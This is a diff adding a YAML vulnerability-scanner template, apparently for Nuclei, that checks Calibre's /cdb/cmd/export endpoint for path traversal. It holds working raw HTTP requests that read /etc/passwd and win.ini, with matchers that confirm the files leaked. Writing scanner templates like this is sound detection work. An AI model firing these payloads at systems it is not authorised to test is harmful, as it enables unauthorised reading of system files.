@@ -1,0 +1,43 @@
+id: Calibre-export-file-read
+
+info:
+  name: Calibre-export-file-read
+  author: JJBond-team
+  severity: medium
+  description: |
+    This template tests for Path Traversal vulnerability by attempting to access sensitive files on Linux and Windows systems.
+
+http:
+  - raw:
+      - |
+        POST /cdb/cmd/export HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        ["extra_file", 1, "../../../../../../../../etc/passwd", ""]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*?:[0-9]*:[0-9]*:"
+        part: body
+
+  - raw:
+      - |
+        POST /cdb/cmd/export HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        ["extra_file", 1, "c:\\windows\\win.ini", ""]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "for 16-bit app support"
+        part: body
